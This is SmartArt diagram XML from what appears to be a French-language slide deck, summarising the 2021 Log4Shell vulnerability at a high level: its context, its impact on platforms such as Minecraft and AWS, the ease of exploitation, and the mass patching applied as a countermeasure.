    <dgm:cxn modelId="{12C8AE1B-48CB-4148-8A50-868835B5A807}" type="presParOf" srcId="{84E512AF-E414-481F-8BED-ECA56D5F840A}" destId="{5B3B43EB-5A37-4337-8B22-6F3D71F11C45}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconLabelList"/>
    <dgm:cxn modelId="{CD8159B1-3EDC-4AF5-ADC8-C3A382D728F5}" type="presParOf" srcId="{4BEB1928-DF3D-4220-9105-9F3CF596F173}" destId="{C3D3979B-A7D8-4A82-90C1-4B22883C142B}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconLabelList"/>
    <dgm:cxn modelId="{583D36D0-8588-4BFE-A7F6-38D780E45CBE}" type="presParOf" srcId="{4BEB1928-DF3D-4220-9105-9F3CF596F173}" destId="{4161183B-56DB-49B5-8473-A00C6CED27A8}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconLabelList"/>
    <dgm:cxn modelId="{BE2D30B5-9865-42A4-9C12-86042A680118}" type="presParOf" srcId="{4161183B-56DB-49B5-8473-A00C6CED27A8}" destId="{9E942A9D-B9BE-4918-B117-070E115AEB0C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconLabelList"/>
    <dgm:cxn modelId="{B46EB875-A05F-467B-BB50-468E96C5812B}" type="presParOf" srcId="{4161183B-56DB-49B5-8473-A00C6CED27A8}" destId="{AD175692-0D9F-4203-A8AE-B3DA171A291C}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconLabelList"/>
    <dgm:cxn modelId="{572B39D7-9D60-4534-94E0-0D24847AAB0F}" type="presParOf" srcId="{4161183B-56DB-49B5-8473-A00C6CED27A8}" destId="{424956B0-1B85-4A89-B3FB-1583D8EA8674}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconLabelList"/>
    <dgm:cxn modelId="{E1C428E4-1A25-41D4-A189-333BD6F8B0EB}" type="presParOf" srcId="{4BEB1928-DF3D-4220-9105-9F3CF596F173}" destId="{1F423333-175B-4AE8-B670-4963F6A7F88A}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconLabelList"/>
    <dgm:cxn modelId="{F2FE2BA5-2053-4909-80F3-A12B26109139}" type="presParOf" srcId="{4BEB1928-DF3D-4220-9105-9F3CF596F173}" destId="{BC9788AD-D0B6-4E59-892C-E04BA30BB593}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconLabelList"/>
    <dgm:cxn modelId="{3915B277-21BE-4ECF-BB54-AC2DAA0C98B9}" type="presParOf" srcId="{BC9788AD-D0B6-4E59-892C-E04BA30BB593}" destId="{A65F9E55-2EE0-43E2-88E2-52971D396432}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconLabelList"/>
    <dgm:cxn modelId="{4EF19C7F-9B1D-4CAC-86EB-CA4655993BD5}" type="presParOf" srcId="{BC9788AD-D0B6-4E59-892C-E04BA30BB593}" destId="{026F0898-EF17-447A-84EE-32BDAF641DCB}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconLabelList"/>
    <dgm:cxn modelId="{74D48B49-5F9C-4E4E-B035-7E68D7B68EAC}" type="presParOf" srcId="{BC9788AD-D0B6-4E59-892C-E04BA30BB593}" destId="{714E1A8C-572F-4DF0-8FBB-435C70C08CD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703E86-87D3-4B6C-B5CB-64ADD0D12C0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99DFD2-19A5-4A6E-9B50-6F04655F2BC9}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Exemple 1 : Log4Shell (2021)</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{686E7297-00B2-4B2B-AF82-76FDE7F6BBD2}" type="parTrans" cxnId="{30A2AAD8-4715-472C-8C1C-C9E460BD2F27}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{73B0BA4D-91FA-4D24-AF8F-5D3359B8E1D1}" type="sibTrans" cxnId="{30A2AAD8-4715-472C-8C1C-C9E460BD2F27}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C715DB1C-D026-4F72-B666-2423E980F7DF}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Contexte :</a:t>
          </a:r>
          <a:br>
            <a:rPr lang="en-GB"/>
          </a:br>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Vulnérabilité critique dans la bibliothèque Log4j de Java.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B45788FE-EFD7-42D8-97EA-5C2BF4306CA0}" type="parTrans" cxnId="{598CB4F2-0011-4045-8C40-E5A43F802843}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{08AB380A-3EF9-4297-90B9-B29D38F1009F}" type="sibTrans" cxnId="{598CB4F2-0011-4045-8C40-E5A43F802843}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{927ABA44-2FB4-40FF-B5A9-25D64E3425C8}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Exploitation par injection de données malveillantes dans les logs.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B14E8BC5-1B47-41A8-BA25-984B8EC00F90}" type="parTrans" cxnId="{878D3390-6F92-4A12-BB5C-2A3E07C4C1D5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DFF8E947-A3E6-48FB-ACF9-4835F8B13A86}" type="sibTrans" cxnId="{878D3390-6F92-4A12-BB5C-2A3E07C4C1D5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{78F00908-DC9B-4FCD-8629-9FCC74CEDFD3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Accès total au serveur compromis.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C3FDFC4A-29BF-4E84-B2CC-C5FF81D7FDA6}" type="parTrans" cxnId="{0BF94B85-7209-4A87-95B7-A1324362CFEF}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2BD90186-3B87-4676-9E61-0CCC3C401477}" type="sibTrans" cxnId="{0BF94B85-7209-4A87-95B7-A1324362CFEF}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1EC2076D-9EF1-435B-9F3F-8BBB5CD2CE6F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Impact :</a:t>
          </a:r>
          <a:br>
            <a:rPr lang="en-GB"/>
          </a:br>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Affecte des milliers d’applications (par ex., Minecraft, AWS).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5EC755E7-9AF4-4DF1-BF72-DA3313500C3D}" type="parTrans" cxnId="{B2C416C1-632E-4554-974E-6D29B2643E83}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{EA74D227-FE8A-4EC6-A598-01BD21C2CB6D}" type="sibTrans" cxnId="{B2C416C1-632E-4554-974E-6D29B2643E83}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{99E4E442-9FB2-4FBF-AA7D-946776FDD5CC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Exploit facile à reproduire avec des payloads JNDI.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{91B1DAB8-4336-4ABB-B796-C2CEFABA6917}" type="parTrans" cxnId="{BB72620B-8817-4AB5-820E-B575D160802F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D7F96648-0C32-4C96-9CA5-CDD6DD88E55F}" type="sibTrans" cxnId="{BB72620B-8817-4AB5-820E-B575D160802F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4383257C-9ED8-944D-82E5-39D16C971FB9}" type="pres">
      <dgm:prSet presAssocID="{8C703E86-87D3-4B6C-B5CB-64ADD0D12C0F}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{3965EC94-D663-B94B-93E8-988B344E1DFE}" type="pres">
      <dgm:prSet presAssocID="{8499DFD2-19A5-4A6E-9B50-6F04655F2BC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B5FCE17-B126-C141-BC48-E13539298364}" type="pres">
      <dgm:prSet presAssocID="{73B0BA4D-91FA-4D24-AF8F-5D3359B8E1D1}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A767A735-0CA9-0641-AD50-B0DF97872CF3}" type="pres">
      <dgm:prSet presAssocID="{C715DB1C-D026-4F72-B666-2423E980F7D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2764EFE-C90C-1E45-B6D9-ACE85A4684D4}" type="pres">
      <dgm:prSet presAssocID="{C715DB1C-D026-4F72-B666-2423E980F7DF}" presName="childText" presStyleLbl="revTx" presStyleIdx="0" presStyleCnt="2">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7A243271-A2A3-DB4B-9109-C9001ED8C71B}" type="pres">
      <dgm:prSet presAssocID="{1EC2076D-9EF1-435B-9F3F-8BBB5CD2CE6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28C12F9-67BF-0947-8CD8-4470018EAD29}" type="pres">
      <dgm:prSet presAssocID="{1EC2076D-9EF1-435B-9F3F-8BBB5CD2CE6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749CC07-9395-9A41-86CF-23F30FC885D4}" type="presOf" srcId="{C715DB1C-D026-4F72-B666-2423E980F7DF}" destId="{A767A735-0CA9-0641-AD50-B0DF97872CF3}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{BB72620B-8817-4AB5-820E-B575D160802F}" srcId="{1EC2076D-9EF1-435B-9F3F-8BBB5CD2CE6F}" destId="{99E4E442-9FB2-4FBF-AA7D-946776FDD5CC}" srcOrd="0" destOrd="0" parTransId="{91B1DAB8-4336-4ABB-B796-C2CEFABA6917}" sibTransId="{D7F96648-0C32-4C96-9CA5-CDD6DD88E55F}"/>
    <dgm:cxn modelId="{C4288E44-DD0E-B540-AF8B-C7525C25F6CD}" type="presOf" srcId="{78F00908-DC9B-4FCD-8629-9FCC74CEDFD3}" destId="{82764EFE-C90C-1E45-B6D9-ACE85A4684D4}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{8E5A5979-3756-5F48-8EE1-4910C96D1D16}" type="presOf" srcId="{8C703E86-87D3-4B6C-B5CB-64ADD0D12C0F}" destId="{4383257C-9ED8-944D-82E5-39D16C971FB9}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{0BF94B85-7209-4A87-95B7-A1324362CFEF}" srcId="{C715DB1C-D026-4F72-B666-2423E980F7DF}" destId="{78F00908-DC9B-4FCD-8629-9FCC74CEDFD3}" srcOrd="1" destOrd="0" parTransId="{C3FDFC4A-29BF-4E84-B2CC-C5FF81D7FDA6}" sibTransId="{2BD90186-3B87-4676-9E61-0CCC3C401477}"/>
    <dgm:cxn modelId="{878D3390-6F92-4A12-BB5C-2A3E07C4C1D5}" srcId="{C715DB1C-D026-4F72-B666-2423E980F7DF}" destId="{927ABA44-2FB4-40FF-B5A9-25D64E3425C8}" srcOrd="0" destOrd="0" parTransId="{B14E8BC5-1B47-41A8-BA25-984B8EC00F90}" sibTransId="{DFF8E947-A3E6-48FB-ACF9-4835F8B13A86}"/>
    <dgm:cxn modelId="{9A585B9C-8866-294E-B474-0239FD4EDF4B}" type="presOf" srcId="{8499DFD2-19A5-4A6E-9B50-6F04655F2BC9}" destId="{3965EC94-D663-B94B-93E8-988B344E1DFE}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{E41D2BAC-10DB-B945-A2E0-B203BCC60CB8}" type="presOf" srcId="{99E4E442-9FB2-4FBF-AA7D-946776FDD5CC}" destId="{228C12F9-67BF-0947-8CD8-4470018EAD29}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{071424B5-F673-8849-914D-2A3DDBBFA9BF}" type="presOf" srcId="{1EC2076D-9EF1-435B-9F3F-8BBB5CD2CE6F}" destId="{7A243271-A2A3-DB4B-9109-C9001ED8C71B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{B2C416C1-632E-4554-974E-6D29B2643E83}" srcId="{8C703E86-87D3-4B6C-B5CB-64ADD0D12C0F}" destId="{1EC2076D-9EF1-435B-9F3F-8BBB5CD2CE6F}" srcOrd="2" destOrd="0" parTransId="{5EC755E7-9AF4-4DF1-BF72-DA3313500C3D}" sibTransId="{EA74D227-FE8A-4EC6-A598-01BD21C2CB6D}"/>
    <dgm:cxn modelId="{A868E7C1-B911-B44D-B479-F84A39DAF816}" type="presOf" srcId="{927ABA44-2FB4-40FF-B5A9-25D64E3425C8}" destId="{82764EFE-C90C-1E45-B6D9-ACE85A4684D4}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{30A2AAD8-4715-472C-8C1C-C9E460BD2F27}" srcId="{8C703E86-87D3-4B6C-B5CB-64ADD0D12C0F}" destId="{8499DFD2-19A5-4A6E-9B50-6F04655F2BC9}" srcOrd="0" destOrd="0" parTransId="{686E7297-00B2-4B2B-AF82-76FDE7F6BBD2}" sibTransId="{73B0BA4D-91FA-4D24-AF8F-5D3359B8E1D1}"/>
    <dgm:cxn modelId="{598CB4F2-0011-4045-8C40-E5A43F802843}" srcId="{8C703E86-87D3-4B6C-B5CB-64ADD0D12C0F}" destId="{C715DB1C-D026-4F72-B666-2423E980F7DF}" srcOrd="1" destOrd="0" parTransId="{B45788FE-EFD7-42D8-97EA-5C2BF4306CA0}" sibTransId="{08AB380A-3EF9-4297-90B9-B29D38F1009F}"/>
    <dgm:cxn modelId="{FC3B3C81-205F-4B49-A7E5-8F1F3800267D}" type="presParOf" srcId="{4383257C-9ED8-944D-82E5-39D16C971FB9}" destId="{3965EC94-D663-B94B-93E8-988B344E1DFE}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{89DCA58B-6FDF-9B4B-AF20-A06EDE4DDCAB}" type="presParOf" srcId="{4383257C-9ED8-944D-82E5-39D16C971FB9}" destId="{1B5FCE17-B126-C141-BC48-E13539298364}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{4FFFC48A-D7DE-5A4E-A3AF-F73BAC481D91}" type="presParOf" srcId="{4383257C-9ED8-944D-82E5-39D16C971FB9}" destId="{A767A735-0CA9-0641-AD50-B0DF97872CF3}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{372CCEFD-5064-084D-81EE-AF2CCDA761EB}" type="presParOf" srcId="{4383257C-9ED8-944D-82E5-39D16C971FB9}" destId="{82764EFE-C90C-1E45-B6D9-ACE85A4684D4}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{F7C88084-7071-9B4D-B3D0-E68234DEA952}" type="presParOf" srcId="{4383257C-9ED8-944D-82E5-39D16C971FB9}" destId="{7A243271-A2A3-DB4B-9109-C9001ED8C71B}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{AE3D5B8D-43C6-1D4C-8E15-7F74CB00EB3A}" type="presParOf" srcId="{4383257C-9ED8-944D-82E5-39D16C971FB9}" destId="{228C12F9-67BF-0947-8CD8-4470018EAD2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E4EAF3-A73F-4154-9041-8B6D4CB35FD8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E78065D-6440-4AA0-8724-21316DA4FBC0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Portée universelle :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5FC9370E-3B74-4D8F-9A7E-16ABB0690666}" type="parTrans" cxnId="{C6571825-A3F5-4617-98AE-9E36BAAF3854}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4BD24608-B4FF-4F86-A659-EDF47822E711}" type="sibTrans" cxnId="{C6571825-A3F5-4617-98AE-9E36BAAF3854}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E16A359C-F1D6-4E6C-A744-36441E9A68AB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Impactant de nombreuses plateformes (services cloud, jeux en ligne).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{29B83B8A-7EA3-4119-885F-EC2E6CC0701B}" type="parTrans" cxnId="{F787BF5F-9611-4053-AF6F-9541EB5000F9}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7B5542A6-C485-4A1E-8A08-4ADA13B660C4}" type="sibTrans" cxnId="{F787BF5F-9611-4053-AF6F-9541EB5000F9}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1A37CD49-31A0-479A-A85C-9CBE8C4FF411}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Exploitation facile :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B0B1DA5E-6591-4FF4-BE1D-39EFB5730303}" type="parTrans" cxnId="{0B25DB74-B4C2-46C6-BD83-8A9B993BC0F0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C4E48107-2212-4DC4-8194-A80326EB06A2}" type="sibTrans" cxnId="{0B25DB74-B4C2-46C6-BD83-8A9B993BC0F0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{16F36751-F815-4463-9F85-7E3744F1A164}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Nécessite peu de compétences techniques pour exécuter un payload.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{38281167-FEE9-4659-8694-2FD46A078D53}" type="parTrans" cxnId="{F97FCBE0-040E-4CAF-8137-FFD31EFC255C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E8E4E516-C330-4556-ACA7-0128CDA3F5F5}" type="sibTrans" cxnId="{F97FCBE0-040E-4CAF-8137-FFD31EFC255C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{126DA113-6B2B-49E1-B1E9-94323D23494C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Contre-mesures appliquées :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{42EDB878-0F22-422A-8E77-627888CAE623}" type="parTrans" cxnId="{D42E7E20-22D1-4FFD-8AD7-0C2956581E6A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3267ADD6-44EB-4265-B389-24E687EC7A9D}" type="sibTrans" cxnId="{D42E7E20-22D1-4FFD-8AD7-0C2956581E6A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{84CE5E48-AB2A-42C2-8E5F-13CBBB0B473E}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Mise à jour massive des applications vulnérables.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{80B991AD-9F31-4E49-8763-E2128C401F6D}" type="parTrans" cxnId="{D28F0157-BC51-4ACD-BFED-5D7A4D8901B5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4ABCFACC-5368-4FB7-93F5-56FD4FEA1D7D}" type="sibTrans" cxnId="{D28F0157-BC51-4ACD-BFED-5D7A4D8901B5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{00254EF7-15EC-974F-BFC7-605524315E56}" type="pres">
      <dgm:prSet presAssocID="{45E4EAF3-A73F-4154-9041-8B6D4CB35FD8}" presName="Name0" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{054398D7-EDAD-4A40-B3FD-3F0E8D489498}" type="pres">
      <dgm:prSet presAssocID="{BE78065D-6440-4AA0-8724-21316DA4FBC0}" presName="linNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{02C00511-8A88-1E4B-8F31-67079EE03038}" type="pres">
      <dgm:prSet presAssocID="{BE78065D-6440-4AA0-8724-21316DA4FBC0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11BC0BEC-B366-FE47-8B1A-F03D8F090FD4}" type="pres">
      <dgm:prSet presAssocID="{BE78065D-6440-4AA0-8724-21316DA4FBC0}" presName="descendantText" presStyleLbl="alignAccFollowNode1" presStyleIdx="0" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{8982072D-1CE6-CE4B-B088-B2EC7F5BA439}" type="pres">
      <dgm:prSet presAssocID="{4BD24608-B4FF-4F86-A659-EDF47822E711}" presName="sp" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{D53CA4A9-A9E6-DC45-9B3B-D38459F9CD71}" type="pres">
      <dgm:prSet presAssocID="{1A37CD49-31A0-479A-A85C-9CBE8C4FF411}" presName="linNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{2A925559-860F-D74D-9EF0-87C652373DFD}" type="pres">
      <dgm:prSet presAssocID="{1A37CD49-31A0-479A-A85C-9CBE8C4FF411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4E82014A-B7A3-DA4D-BC04-53B4F64590F7}" type="pres">
      <dgm:prSet presAssocID="{1A37CD49-31A0-479A-A85C-9CBE8C4FF411}" presName="descendantText" presStyleLbl="alignAccFollowNode1" presStyleIdx="1" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{ECDA30CA-8D15-6B4C-8BCD-E9D36273660D}" type="pres">
      <dgm:prSet presAssocID="{C4E48107-2212-4DC4-8194-A80326EB06A2}" presName="sp" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{109452D9-34C9-C049-809A-2C7CF503E7E3}" type="pres">
      <dgm:prSet presAssocID="{126DA113-6B2B-49E1-B1E9-94323D23494C}" presName="linNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
